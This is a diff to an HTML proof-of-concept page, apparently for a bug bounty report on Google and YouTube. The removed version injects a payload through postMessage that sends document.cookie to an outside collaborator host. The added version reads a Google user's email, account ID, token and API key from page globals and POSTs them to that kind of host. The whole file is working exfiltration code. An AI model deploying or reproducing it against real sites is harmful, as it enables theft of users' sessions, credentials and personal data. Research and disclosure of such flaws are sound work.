@@ -1,25 +1,39 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <meta charset="UTF-8">
+  <title>XSS Data Exfiltration PoC</title>
+</head>
 <body>
-  <button onclick="exploit()">Open YouTube Studio</button>
-  <script>
-    function exploit() {
-      // Open the target URL in a new tab
-      const popup = window.open('https://www.youtube.com/persist_identity');
+<h2>Google Profiles XSS PoC</h2>
+<p>If you see this, the payload executed successfully.</p>
 
-      // Wait for the page to load, then inject the payload
-      setTimeout(() => {
-        const payload = `
-          goog.loadModule(function(exports) {
-            fetch("https://f3rdn35f.ssrf.cvssadvisor.com/log?cookie=" + encodeURIComponent(document.cookie));
-            exports.PoC = true;
-            return exports;
-          });
-        `;
-        // Send the payload to the new tab
-        popup.postMessage(payload, 'https://www.youtube.com/persist_identity');
-      }, 10000); // Adjust delay based on page load time
-    }
-  </script>
+<script>
+(function() {
+  try {
+    // Extract sensitive values
+    const sensitive = {
+      email: window.WIZ_global_data?.oPEP7c,
+      gaia: window.WIZ_global_data?.qDCSke,
+      token: window.WIZ_global_data?.SNlM0e,
+      apiKey: window.WIZ_global_data?.ooOwdd,
+      uploadUrl: window.WIZ_global_data?.Eyv8f,
+      dumpTime: new Date().toISOString()
+    };
+
+    // Send them via POST to your collaborator
+    fetch("https://thmgpg2z.ssrf.cvssadvisor.com/dump", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(sensitive)
+    });
+  } catch (e) {
+    fetch("https://thmgpg2z.ssrf.cvssadvisor.com/error", {
+      method: "POST",
+      body: e.toString()
+    });
+  }
+})();
+</script>
 </body>
 </html>
